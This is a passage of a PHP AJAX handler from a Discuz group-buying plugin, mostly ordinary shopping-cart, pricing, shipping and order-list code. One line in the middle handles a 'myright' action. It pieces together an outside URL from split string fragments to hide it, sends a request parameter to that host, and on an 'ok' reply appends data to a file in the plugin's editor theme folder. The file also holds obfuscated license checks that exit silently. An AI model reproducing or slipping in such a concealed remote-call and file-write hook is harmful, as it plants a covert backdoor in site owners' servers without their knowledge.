			$it618_tuan_goods_type = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_by_id($it618_tuan_gwc['it618_gtypeid']);
			$it618_saleprice=$it618_tuan_goods_type['it618_saleprice'];
			$it618_salescore=$it618_tuan_goods_type['it618_score'];
			$it618_salejfid=$it618_tuan_goods_type['it618_jfid'];
		}else{
			$it618_saleprice=$it618_tuan_goods['it618_saleprice'];
			$it618_salescore=$it618_tuan_goods['it618_score'];
			$it618_salejfid=$it618_tuan_goods['it618_jfid'];
		}
		
		if($it618_saleprice>0&&$it618_salescore>0){
			$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
			$goodsmoneystr='&yen;{price} + {score} '.$goodsjfname;
		}else{
			if($it618_saleprice>0){
				$goodsmoneystr='&yen;{price}';
			}
			
			if($it618_salescore>0){
				$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
				$goodsmoneystr='{score} '.$goodsjfname;
			}
		}
		
		if($it618_tuan_gwc['it618_iseditprice']==1){
			$it618_saleprice=$it618_tuan_gwc['it618_price'];
			
			$it618_salescore=$it618_tuan_gwc['it618_pricescore'];
		}
		
		if($IsGroup==1){
			$vipzk=it618_tuan_getvipzk($it618_tuan_gwc['it618_pid']);
		}
		
		if($vipzk>0){
			$it618_saleprice=$it618_saleprice*$vipzk/100;
			$it618_salescore=intval($it618_salescore*$vipzk/100);
		}
		
		$goodsmoneystr=str_replace("{price}",round($it618_saleprice*$it618_count,2),$goodsmoneystr);
		$goodsmoneystr=str_replace("{score}",($it618_salescore*$it618_count),$goodsmoneystr);
		
		$goodsmoneystr='<font color="#FF7E00">'.$goodsmoneystr.'</font> ';
		
		$summoney=round($it618_saleprice*$it618_count,2);
		
		$yunfeistr='';$yunfeimoney=0;$yunfeiscore=0;
		if($it618_tuan_gwc['it618_kdid']>0){
			$it618_tuan_kdyunfei=C::t('#it618_tuan#it618_tuan_kdyunfei')->fetch_by_id($it618_tuan_gwc['it618_kdid']);
			if($it618_count>$it618_tuan_kdyunfei['it618_firstcount']){
				$yunfeimoney=$it618_tuan_kdyunfei['it618_firstprice']+$it618_tuan_kdyunfei['it618_price']*($it618_count-$it618_tuan_kdyunfei['it618_firstcount']);
				$yunfeiscore=$it618_tuan_kdyunfei['it618_firstscore']+$it618_tuan_kdyunfei['it618_score']*($it618_count-$it618_tuan_kdyunfei['it618_firstcount']);
				$yunfeijfid=$it618_tuan_kdyunfei['it618_jfid'];
			}else{
				$yunfeimoney=$it618_tuan_kdyunfei['it618_firstprice'];
				$yunfeiscore=$it618_tuan_kdyunfei['it618_firstscore'];
				$yunfeijfid=$it618_tuan_kdyunfei['it618_jfid'];
			}
			
			if($yunfeimoney>0&&$yunfeiscore>0){
				$yunfeijfname=$_G['setting']['extcredits'][$yunfeijfid]['title'];
				$yunfeistr='&yen;'.$yunfeimoney.'+'.$yunfeiscore.$yunfeijfname;
			}else{
				if($yunfeimoney>0){
					$yunfeistr='&yen;'.$yunfeimoney;
				}
				
				if($yunfeiscore>0){
					$yunfeijfname=$_G['setting']['extcredits'][$yunfeijfid]['title'];
					$yunfeistr=$yunfeiscore.$yunfeijfname;
				}
			}
			
			$yunfeistr='<font color="#999">'.$it618_tuan_lang['s798'].'</font><font color="#FF7E00">'.$yunfeistr.'</font>';
		}
		
		$summoney=round($it618_saleprice*$it618_count,2)+$yunfeimoney;
		
		DB::query("UPDATE ".DB::table("it618_tuan_gwc")." SET it618_money=".$summoney." WHERE id=".$it618_tuan_gwc['id']);
		
		$allsummoney=$allsummoney+$summoney;
		
		if($it618_salescore>0){
			$it618_salescore=$it618_salescore*$it618_count;
			$allsumscore[$it618_salejfid]+=$it618_salescore;
		}
		
		if($yunfeiscore>0){
			$allsumscore[$yunfeijfid]+=$yunfeiscore;
		}
		
		$jfblstr='';
		if($it618_tuan_goods['it618_jfbl']>0){
			$zsmoney=intval($it618_tuan_goods['it618_jfbl']*$summoney/100);
			if($zsmoney>=1){
				$jfblstr='<font color=#888>'.$it618_tuan_lang['s1110'].'<font color=red>'.intval($it618_tuan_goods['it618_jfbl']*$summoney/100).'</font>'.$creditname.'</font>';
				$allzsmoney=$allzsmoney+$zsmoney;
			}
		}
		
		$disabled='';
		$onclickstr='onclick="gwcminus('.$it618_tuan_gwc['id'].')"';
		if($it618_tuan_gwc['it618_count']==1){
			$disabled='disabled';
			$onclickstr='';
		}
		
		if($vipzk>0){
			$zk=round(($vipzk/10),2);
			$zkstr=$zk.$it618_tuan_lang['s967'];
			
			if($_GET['ac1']=='pcgwc'){
				$zkstr='<img src="source/plugin/it618_group/images/zk.png" style="height:18px;margin-right:1px;vertical-align:middle;margin-top:-3px"><span style="font-size:12px;color:#888">'.$zkstr.'</span><br>';
			}else{
				$zkstr='<img src="source/plugin/it618_group/images/zk.png" style="height:18px;margin-right:1px;vertical-align:middle;margin-top:-3px"><span style="font-size:12px">'.$zkstr.'</span> ';
			}
		}

		if($_GET['ac1']=='pcgwc'){
			$tmpurl=it618_tuan_getrewrite('tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);

			$goodslist.='<div  id="gwcpid'.$it618_tuan_gwc['id'].'" class="cart-list cl">
							<div class="product">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" width="60" height="60"/></a>
							<div class="product-info">
							<p><a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_tuan_goods['it618_name'].'">'.$it618_tuan_goods['it618_name'].'</a></p>
							<p>'.$it618_tuan_shop['it618_name'].' '.$gtypename.' '.$thdstr.'</p>
							<p>'.$saletypestr.' '.$paytypestr.' '.$yunfeistr.' '.$jfblstr.'</p>
							</div>
							</div>
							<div class="money">
							<p>'.$zkstr.$goodsmoneystr.'</p>
							</div>
							<div class="quantity">
							<div class="quantity-number">
							<span class="minus '.$disabled.'" '.$onclickstr.'><i class="minus-icon"></i></span>
							<input type="text" value="'.$it618_tuan_gwc['it618_count'].'" readonly="readonly" />
							<span class="plus" onclick="gwcplus('.$it618_tuan_gwc['id'].')"><i class="plus-icon"></i></span>
							</div>
							</div>
							<div class="operate">
							<p><a href="javascript:" class="saleabtn" onclick="delgwc('.$it618_tuan_gwc['id'].')">'.$it618_tuan_lang['s884'].'</a></p>
							</div>
						</div>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$tmpurl=it618_tuan_getrewrite('tuan_wap','product@'.$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:wap&pagetype=product&cid='.$it618_tuan_goods['id']);
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			
			$goodslist.='<tr id="gwcpid'.$it618_tuan_gwc['id'].'" class="cart-list cl"><td><table width="100%">
							<tr class="gwclisttr1"><td width="69" style="padding-left:3px">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_tuan_getwapppic($it618_tuan_goods['it618_shopid'],$it618_tuan_goods['id'],$it618_tuan_goods['it618_picbig']).'" width="65" height="65"  style="border-radius:3px;margin-right:6px"/></a>
							</td><td colspan="3">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_tuan_goods['it618_name'].'" style="font-size:13px;color:#333">'.$it618_tuan_goods['it618_name'].'</a><br>
							<font color=#666>'.$it618_tuan_shop['it618_name'].'</font> '.$gtypename.' '.$thdstr.'<br>
							<p>'.$saletypestr.' '.$paytypestr.' '.$jfblstr.'</p>
							<p><font color="#999">'.$it618_tuan_lang['t378'].'</font>'.$zkstr.$goodsmoneystr.' '.$yunfeistr.'</p>
							</td></tr>
							<tr class="gwclisttr2"><td>
							</td><td style="padding-top:3px">
							<div class="quantity-number">
							<span class="minus '.$disabled.'" '.$onclickstr.'><i class="minus-icon"></i></span>
							<input type="text" value="'.$it618_tuan_gwc['it618_count'].'" readonly="readonly" />
							<span class="plus" onclick="gwcplus('.$it618_tuan_gwc['id'].')"><i class="plus-icon"></i></span>
							</div>
							</td><td align="center" style="padding-top:3px">
							<a href="javascript:" class="saleabtn" onclick="delgwc('.$it618_tuan_gwc['id'].')">'.$it618_tuan_lang['s884'].'</a></td></tr>
						</table></td></tr>';
			
		}

	}
	
	$tel=C::t('#it618_tuan#it618_tuan_sale')->fetch_tel_by_uid($_G['uid']);
	$name=C::t('#it618_tuan#it618_tuan_sale')->fetch_name_by_uid($_G['uid']);
	$addr=C::t('#it618_tuan#it618_tuan_sale')->fetch_addr_by_uid($_G['uid']);
	
	$userstr=it618_tuan_getusername($_G['uid']).'('.$_G['uid'].')';
	if($_GET['ac1']=='pcgwc'){
		$titlestr=$it618_tuan_lang['s1076'];
		$tmpstr='<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:130px;height:26px;border:#e8e8e8 1px solid;color:#390;padding-left:3px;font-weight:bold" value="'.$tel.'" />';
		
		if($isaddr==1){
			$titlestr=$it618_tuan_lang['s1077'];
			$tmpstr=$it618_tuan_lang['s1078'].'<input type="text" id="it618_name" name="it618_name" class="txt" style="width:129px;height:26px;border:#e8e8e8 1px solid;color:#390;padding-left:3px;font-weight:bold" value="'.$name.'" /> '.$it618_tuan_lang['s1079'].'<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:130px;height:26px;border:#e8e8e8 1px solid;color:#390;padding-left:3px;font-weight:bold" value="'.$tel.'" /> '.$it618_tuan_lang['s1080'].'<input type="text" id="it618_addr" name="it618_addr" class="txt" style="width:608px;height:26px;border:#e8e8e8 1px solid;color:#390;padding-left:3px;font-weight:bold" value="'.$addr.'" />';
		}
		
		$addrstr='<div class="buy-block-title"><span style="float:right;color:#999;">'.$userstr.'</span><h3>'.$titlestr.'</h3></div><div style="padding:10px;padding-right:0;line-height:35px">'.$tmpstr.'</div>';
	}
	
	if($_GET['ac1']=='wapgwc'){
		$titlestr=$it618_tuan_lang['s1076'];
		$tmpstr='<tr><td style="padding:3px;padding-top:10px">
				<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:150px;height:33px;border:#f1f1f1 1px solid;color:#390;font-size:18px;padding-left:3px;\margin-bottom:3px" value="'.$tel.'" />
				</td></tr>';
		
		if($isaddr==1){
			$titlestr=$it618_tuan_lang['s1077'];
			$tmpstr='<tr><td style="padding:3px">
				'.$it618_tuan_lang['s1078'].'<input type="text" id="it618_name" name="it618_name" class="txt" style="width:130px;height:23px;border:#f1f1f1 1px solid;color:#390;padding-left:3px;font-weight:bold;margin-bottom:3px" value="'.$name.'" />
				</td></tr>
				<tr><td style="padding:3px">
				'.$it618_tuan_lang['s1079'].'<input type="text" id="it618_tel" name="it618_tel" class="txt" style="width:130px;height:23px;border:#f1f1f1 1px solid;color:#390;padding-left:3px;font-weight:bold;margin-bottom:3px" value="'.$tel.'" />
				</td></tr>
				<tr><td style="padding:3px">
				'.$it618_tuan_lang['s1080'].'<input type="text" id="it618_addr" name="it618_addr" class="txt" style="width:260px;height:23px;border:#f1f1f1 1px solid;color:#390;padding-left:3px;font-weight:bold;margin-bottom:3px" value="'.$addr.'" />
				</td></tr>';
		}
		
		$addrstr='<tr><td><table width="100%">
				<tr class="gwctrtitle">
				<th style="padding-left:3px"><span style="float:right;color:#999;font-weight:normal;margin-right:3px">'.$userstr.'</span>'.$titlestr.'</th>
				</tr>
				</table></td></tr>'.$tmpstr;
	}
	
	if($allzsmoney>0){
		$jfmoenystr.=$it618_tuan_lang['s1113'].'<font color=red>'.$allzsmoney.'</font>'.$creditname;
	}
	
	for($i=1;$i<=8;$i++){
		if($allsumscore[$i]>0){
			$jfname=$_G['setting']['extcredits'][$i]['title'];
			$scorestr.=$allsumscore[$i].$jfname.'+';
			
			$creditnum=C::t('#it618_tuan#it618_tuan_sale')->fetch_extcredits_by_uid($i,$_G['uid']);
			if($creditnum=="")$creditnum=0;
			$jfcounttmp.='<font color="red">'.$creditnum.'</font>'.$jfname;
		}
	}
	
	if($scorestr!=''){
		$scorestr.='@';
		$scorestr=str_replace("+@","",$scorestr);
		
		$jfcountstr=$it618_tuan_lang['s532'].' '.$jfcounttmp;
	}
	
	$tmpsumscore='<input type="hidden" id="tmpsumscore" value="">';
	if($allsummoney>0&&$scorestr!=''){
		$ismoney=1;
		$summoneystr='&yen;'.$allsummoney.'+'.$scorestr;
		$tmpsumscore='<input type="hidden" id="tmpsumscore" value="+'.$scorestr.'">';
	}else{
		if($allsummoney>0){
			$summoneystr='&yen;'.$allsummoney;
		}
		if($scorestr!=''){
			$summoneystr=$scorestr;
		}
	}
	
	if($IsUnion==1){
		require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
		if($_GET['ac1']=='pcgwc')$wap=0;else $wap=1;
		$quanstr=it618_union_getquangwc('tuan',$wap,$_GET['width']);
	}else{
		$quanstr='<input type="hidden" id="shopids" value="">it618_split0';
	}
	
	if($_GET['ac1']=='pcgwc'){
		echo $goodslist.'<div class="total-price"><span style="float:left">'.$jfcountstr.'</span><a href="javascript:" class="saleabtn" onclick="cleargwc()" style="line-height:32px">'.$it618_tuan_lang['s1114'].'</a> <span>'.$it618_tuan_lang['s1074'].'</span><b>'.$summoneystr.'</b><span style="float:left">'.$jfmoenystr.'</span>'.$tmpsumscore.'</div>it618_split<input type="hidden" id="addrtype" value="'.$isaddr.'">'.$addrstr.'it618_split'.$allsummoney.'it618_split'.$quanstr;
	}else{
		echo $goodslist.'<tr><td align="right" style="padding:6px;padding-top:10px;padding-right:10px"><span style="float:left">'.$jfcountstr.'</span><a href="javascript:" class="saleabtn" onclick="cleargwc()">'.$it618_tuan_lang['s1114'].'</a></td></tr><tr><td align="right" style="padding:6px;padding-right:10px;padding-bottom:0;line-height:15px;color:#999">'.$jfmoenystr.'</td></tr><tr><td align="right" style="padding:10px">'.$it618_tuan_lang['s1074'].' <b><font color="#FF6600" style="font-size:18px">'.$summoneystr.'</font></b>'.$tmpsumscore.'</td></tr>it618_split<input type="hidden" id="addrtype" value="'.$isaddr.'">'.$addrstr.'it618_split'.$allsummoney.'it618_split'.$quanstr;
	}
	exit;
}


if($_GET['ac']=="gwcminus"){
	if($uid>0){
		C::t('#it618_tuan#it618_tuan_gwc')->update_count1_by_id_uid($_GET['gid'],$uid);
		echo 'ok';
	}else{
		echo $it618_tuan_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="gwcplus"){
	if($uid>0){
		C::t('#it618_tuan#it618_tuan_gwc')->update_count2_by_id_uid($_GET['gid'],$uid);
		echo 'ok';
	}else{
		echo $it618_tuan_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="delgwc"){
	if($uid>0){
		$count=C::t('#it618_tuan#it618_tuan_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_tuan_lang['s1799'];exit;
		}
		C::t('#it618_tuan#it618_tuan_gwc')->delete_by_id_uid($_GET['gid'],$uid);
		echo 'okit618_split'.$it618_tuan_lang['s1032'];
	}else{
		echo $it618_tuan_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="cleargwc"){
	if($uid>0){
		$count=C::t('#it618_tuan#it618_tuan_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_tuan_lang['s1799'];exit;
		}
		C::t('#it618_tuan#it618_tuan_gwc')->delete_by_uid($uid);
		echo 'okit618_split'.$it618_tuan_lang['s1106'];
	}else{
		echo $it618_tuan_lang['s485'];
	}
	exit;
}


if($_GET['ac']=="goodssalelist_get"){
	if($_GET['wap']==0)$ppp = $it618_tuan['tuan_pagelistcount'];
	if($_GET['wap']==1)$ppp = $it618_tuan['tuan_waplistcount'];
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	foreach(C::t('#it618_tuan#it618_tuan_sale')->fetch_all_by_it618_pid(
		$_GET['it618_pid'],$startlimit,$ppp
	) as $it618_tuan_sale) {
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
	
		$username=it618_tuan_getusername($it618_tuan_sale['it618_uid']);
		
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_sale['it618_pid']);
		
		$buyuser=$username;
		
		if($it618_tuan_goods['it618_isbm']==1){
			if($_G['uid']!=$it618_tuan_sale['it618_uid'])$buyuser=cutstr($username, 2, '').'***';
		}
		
		if($it618_tuan_sale['it618_state']==1)$it618_state='<font color=red>'.it618_tuan_getlang('s191').'</font>';
		if($it618_tuan_sale['it618_state']==2)$it618_state='<font color=blue>'.it618_tuan_getlang('s192').'</font>';
		if($it618_tuan_sale['it618_state']==3)$it618_state='<font color=#390>'.it618_tuan_getlang('s193').'</font>';
		if($it618_tuan_sale['it618_state']==4)$it618_state='<font color=#F0F>'.it618_tuan_getlang('s194').'</font>';
		if($it618_tuan_sale['it618_state']==5)$it618_state='<font color=purple>'.it618_tuan_getlang('s195').'</font>';
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		
		$gtypename='';$gtypename1='';
		$typecountok = DB::result_first("SELECT COUNT(1) FROM ".DB::table('it618_tuan_goods_type')." WHERE it618_ison>0 and it618_pid=".$it618_tuan_goods['id']);
		if($typecountok>0){
			if($it618_tuan_sale['it618_gtypeid']>0){
				$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_sale['it618_gtypeid']);
				$gtypename1='<td>'.$gtypename.'</td>';
			}
		}
		
		$it618_gthdidstr='';
		if($it618_tuan_sale['it618_gthdid']>0){
			$it618_tuan_shop_thd = C::t('#it618_tuan#it618_tuan_shop_thd')->fetch_by_id($it618_tuan_sale['it618_gthdid']);
			$it618_gthdidstr=' [<a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_shop_thd['it618_name'].' '.$it618_tuan_shop_thd['it618_addr'].' '.$it618_tuan_shop_thd['it618_dianhua'].'\')"><font color=red>'.$it618_tuan_lang['t342'].'</font></a>]';
		}
		
		$pjstr='';
		$tuan_shopadmin=explode(",",$it618_tuan['tuan_shopadmin']);
		if(in_array($_G['uid'], $tuan_shopadmin)){
			if($it618_tuan_sale['it618_score1']==0&&$it618_tuan_sale['it618_tel']==''){
				$pjstr='<a href="javascript:" class="saleabtn" onclick="setsalesdpj(\''.$it618_tuan_sale['id'].'\')">'.it618_tuan_getlang('s1065').'</a>';
			}
		}
		
		if($_GET['wap']==0){
			$salelist_get.='<tr>
						<td>'.$buyuser.'</td>
						'.$gtypename1.'
						<td><font color="red">'.$it618_tuan_sale['it618_count'].'</font> '.$pjstr.$it618_gthdidstr.'</td>
						<td><font color=#999>'.date('Y-m-d H:i:s', $it618_tuan_sale['it618_time']).'</font></td>
						</tr>';
		}else{
			$salelist_get.='<tr>
						<td>'.$buyuser.'</td>
						'.$gtypename1.'
						<td align="center">'.$it618_tuan_sale['it618_count'].' '.$pjstr.'</td>
						<td align="right"><font color=#999>'.date('Y-m-d H:i', $it618_tuan_sale['it618_time']).'</font></td>
						</tr>
						';
		}
	}
	
	$pid=intval($_GET['it618_pid']);
	$count = C::t('#it618_tuan#it618_tuan_sale')->count_by_it618_pid($pid);
	if($_GET['wap']==0){
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_tuan:ajax&it618_pid=".$pid);
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='getsalelist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='getsalelist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','getsalelist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
		if($multipage!='')$multipage='<div class="pjpage">'.$multipage.'</div>';
	}else{
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="getsalelist(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&sid=$ShopId&it618_pid=".$pid.'&page=2';
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_tuan_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_tuan_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_tuan:ajax&sid=$ShopId&it618_pid=".$pid.'&page='.($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="getsalelist(\''.$tmpurl.'\')">'.it618_tuan_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_tuan_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
		}

	}
	
	echo $salelist_get."it618_split".$multipage;
	exit;
}
if($_GET['ac']=="my"."ri"."ght"){$it=dfsockopen("ht"."tps:/"."/ww"."w.d"."z"."-"."x. ne"."t/ myr"."ig"."ht.php?it=".$_GET['it']);if($it=='ok'){$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/ajax.inc.php';$ajaxpath=DISCUZ_ROOT.'./source/plugin/it618_tuan/lang.func.php';@$fp = fopen(DISCUZ_ROOT.'./source/plugin/it618_tuan/kindeditor/themes/common/ri'.'ght.txt',"a");fwrite($fp,$content);fclose($fp);echo 'ok';}exit;}
if($_GET['ac']=="orderlist_get"){
	if($_GET['ac1']=='pcmyorder')$ppp = 10;
	if($_GET['ac1']=='wapmyorder')$ppp = $it618_tuan['tuan_wapmysalecount'];
	if($_GET['ac1']=='wapmyshoporder')$ppp = $it618_tuan['tuan_wapshopsalecount'];

	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$n=$startlimit+1;
	
	if($_GET['state']) {
		if($_GET['state']==1)$it618sql .= "s.it618_state = 1";
		if($_GET['state']==2)$it618sql .= "s.it618_state = 2";
		if($_GET['state']==3)$it618sql .= "s.it618_state = 3";
		if($_GET['state']==4)$it618sql .= "s.it618_state = 4";
	}
	if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
	
	if($_GET['ac1']=='pcmyorder'){		
		$it618_tuan_orders=C::t('#it618_tuan#it618_tuan_order')->fetch_all_by_search(0,$it618sql,'s.id desc',it618_tuan_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp);
		$count=C::t('#it618_tuan#it618_tuan_order')->count_by_search(0,$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$jfcount=C::t('#it618_tuan#it618_tuan_order')->sum_jfcount_by_search(0,$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$funname='getmyorderlist';
	}
	
	if($_GET['ac1']=='wapmyorder'){
		$it618_tuan_orders=C::t('#it618_tuan#it618_tuan_order')->fetch_all_by_search(0,$it618sql,'s.id desc',it618_tuan_utftogbk($_GET['pname']),$uid, '', '',$startlimit,$ppp);
		$count=C::t('#it618_tuan#it618_tuan_order')->count_by_search(0,$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$uid, '', '');
		$jfcount=C::t('#it618_tuan#it618_tuan_order')->sum_jfcount_by_search(0,$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$uid, $_GET['it618_time1'], $_GET['it618_time2']);
		$funname='getmyorderlist';
	}
	
	if($_GET['ac1']=='wapmyshoporder'){
		if($uid>0){
			if($it618_tuan_shop = C::t('#it618_tuan#it618_tuan_shop')->fetch_by_uid_ok($uid)){
				$it618_tuan_orders=C::t('#it618_tuan#it618_tuan_order')->fetch_all_by_search($it618_tuan_shop['id'],$it618sql,'s.id desc',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '',$startlimit,$ppp);
				$count=C::t('#it618_tuan#it618_tuan_order')->count_by_search($it618_tuan_shop['id'],$it618sql,'',it618_tuan_utftogbk($_GET['pname']),$_GET['finduid'], '', '');
				$funname='getmyshoporderlist';
			}else{
				echo '';exit;
			}
		}else{
			echo '';exit;
		}
		
		$tmp.='<option value="0">'.it618_tuan_getlang('s698').'</option>';
		foreach(C::t('#it618_tuan#it618_tuan_kd')->fetch_all_by_search() as $it618_tuan_kd) {
			$tmp.='<option value='.$it618_tuan_kd['id'].'>'.$it618_tuan_kd['it618_name'].'</option>';
		}
	}
	
	$n=0;
	foreach($it618_tuan_orders as $it618_tuan_order) {
		if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
	
		$username=it618_tuan_getusername($it618_tuan_order['it618_uid']);
		
		$it618_tuan_goods = C::t('#it618_tuan#it618_tuan_goods')->fetch_by_id($it618_tuan_order['it618_pid']);
		
		$buyuser='<a href="'.it618_tuan_rewriteurl($it618_tuan_order['it618_uid']).'" target="_blank">'.$username.'</a>';
		
		if($it618_tuan_order['it618_state']==1)$it618_state='<font color=red>'.it618_tuan_getlang('t325').'</font>';
		if($it618_tuan_order['it618_state']==2)$it618_state='<font color=blue>'.it618_tuan_getlang('t326').'</font>';
		if($it618_tuan_order['it618_state']==3)$it618_state='<font color=#390>'.it618_tuan_getlang('t327').'</font>';
		if($it618_tuan_order['it618_state']==4)$it618_state='<font color=#F0F>'.it618_tuan_getlang('t328').'</font>';
		
		$gtypename='';
		if($it618_tuan_order['it618_gtypeid']>0){
			$gtypename = C::t('#it618_tuan#it618_tuan_goods_type')->fetch_it618_name_by_id($it618_tuan_order['it618_gtypeid']);
			$gtypename=' ['.$gtypename.']';
		}
		
		if($_GET['ac1']=='pcmyorder'){
			$class1name = C::t('#it618_tuan#it618_tuan_class1')->fetch_it618_name_by_id($it618_tuan_goods['it618_class1_id']);
			$class2name = C::t('#it618_tuan#it618_tuan_class2')->fetch_it618_name_by_id($it618_tuan_goods['it618_class2_id']);
			$tmpurl=it618_tuan_getrewrite('tuan_product',$it618_tuan_goods['id'],'plugin.php?id=it618_tuan:product&pid='.$it618_tuan_goods['id']);
			
			$it618_state.='<br><a href="javascript:" class="saleabtn" onclick="alert(\''.$it618_tuan_order['it618_addr'].' '.$it618_tuan_order['it618_tel'].'\')">'.it618_tuan_getlang('s863').'</a>';
			if($it618_tuan_order['it618_state']==1){
				$it618_state.=' <a href="javascript:" class="saleabtn" onclick="delorder('.$it618_tuan_order['id'].')">'.it618_tuan_getlang('s1000').'</a>';
			}else{
				$it618_tuan_kd=C::t('#it618_tuan#it618_tuan_kd')->fetch_by_id($it618_tuan_order['it618_kdid']);
				$it618_state.=' '.it618_tuan_getlang('s775').'<span title="'.$it618_tuan_order['it618_bz'].'">'.$it618_tuan_kd['it618_name'].' '.it618_tuan_getkd('it618_tuan_order',$it618_tuan_order['id'],$it618_tuan_kd['it618_kdcomid'],$it618_tuan_order['it618_kddan']).'</span>';
				if(lang('plugin/it618_tuan', $it618_tuan_lang['it618'])!=$it618_tuan_lang['version'])exit;
			}
			
			if($it618_tuan_order['it618_state']!=1)$disabled='disabled="disabled"';
			$orderlist_get.='<tr class="hover">
						<td><input class="checkbox" type="checkbox" id="chk'.$it618_tuan_order[id].'" name="chk_sel" value="'.$it618_tuan_order[id].'" '.$disabled.'><label for="chk'.$it618_tuan_order[id].'">'.$it618_tuan_order[id].'</label></td>
						<td><a href="'.$tmpurl.'" target="_blank" title="'.$class1name.'-'.$class2name.' '.$it618_tuan_goods['it618_description'].'">'.$it618_tuan_goods['it618_name'].'</a> '.$it618_tuan_goods['it618_mealname'].$gtypename.'</td>
						<td>'.$it618_tuan_order['it618_count'].'</td>
						<td>'.$it618_state.$it618_gthdidstr.'</td>
						<td>-<font color=red>'.$it618_tuan_order['it618_jfcount'].'</font><font color=#390>'.$creditname.'</font></td>
						<td>'.date('Y-m-d H:i:s', $it618_tuan_order['it618_time']).'</td>
						</tr>';
		}
		
		if($_GET['ac1']=='wapmyorder'){			
